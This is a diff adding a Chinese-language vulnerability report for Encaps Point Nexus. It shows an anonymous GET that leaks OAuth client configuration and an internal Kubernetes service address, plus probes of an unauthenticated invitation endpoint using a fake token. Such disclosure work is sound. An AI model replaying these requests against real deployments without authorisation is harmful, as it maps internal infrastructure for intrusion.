@@ -1,0 +1,57 @@
+# Encaps Point Nexus /system/zone-load/layouts-doc 未认证泄露内部 K8s 服务地址与 OAuth 客户端配置
+
+## 组件 / 版本
+Encaps Point Nexus v3.2.22（dms.<target>；OAuth IdP baseUrl 形如 https://<idp>.encaps.io）
+
+## 前置条件
+无需任何账号 / Cookie / 凭据。纯匿名 HTTP GET。
+
+## 复现
+
+### 阴性基线（确认该站点 API 受认证保护，避免误报）
+GET /api/currencies HTTP/2
+Host: dms.<target>
+(无 Cookie)
+
+-> HTTP/2 302
+   location: /signin?redirect=...    （受保护路由统一退回登录）
+
+### 命中：未认证读取内部配置
+GET /system/zone-load/layouts-doc HTTP/2
+Host: dms.<target>
+(无 Cookie)
+
+-> HTTP/2 200
+   Content-Type: application/json;charset=UTF-8
+   Body(~10758B):
+{
+  "_zoneAppConfig": {
+    "baseUrl": "https://dms.<target>",
+    "oauthClient": {
+      "clientId": "<base64 串>",
+      "clientSecret": "********",                 # 服务端已掩码
+      "redirectUri": "https://dms.<target>/oauth",
+      "signoutRedirectUri": "https://dms.<target>/signedout",
+      "internalBaseUrl": "http://internal-auth.<cluster>.svc.cluster.local:60103",  # 内部 K8s 服务
+      "baseUrl": "https://<idp>.encaps.io",
+      "scopes": ":user:full"
+    },
+    "appID": "<uuid>",
+    "providerID": "<uuid>"
+  }
+}
+
+## 判据
+- 匿名 GET 返回 200 + application/json，body._zoneAppConfig.oauthClient.internalBaseUrl 指向 *.svc.cluster.local 内部集群服务；
+- 同时含 providerID / appID / redirectUri / scopes 等 OAuth 客户端配置；
+- 内部主机名公网 DNS 解析 NXDOMAIN（nslookup internal-auth.<cluster>.svc.cluster.local 8.8.8.8 -> NXDOMAIN），佐证其为仅集群内可达的内部拓扑，属非预期对外暴露；
+- clientSecret 被掩码为 ********，未直接泄露密钥（故定级 low）。
+
+## 关联面（探索记录）
+/api/users/invitation/finalize 是该 /api 前缀下唯一绕过认证中间件的写接口（邀请接受流程）：
+- POST 空 body {} -> 422 {"success":false,"errors":[{"message":"Missing required parameter","code":"PRM001"}]}
+- POST 带伪 token -> 500 {"success":false,"errors":[{"message":"Unknown error","code":"UNK001"}]}
+受不可猜解的邀请 token 约束，无有效/无效 token 的判别差分，仅作定性记录。
+
+## 来源
+provenance: 本机 Windows/ARTEX bash shell（经平台记录代理），2026-11-11 15:3x-15:5x UTC，curl 8.5.0。
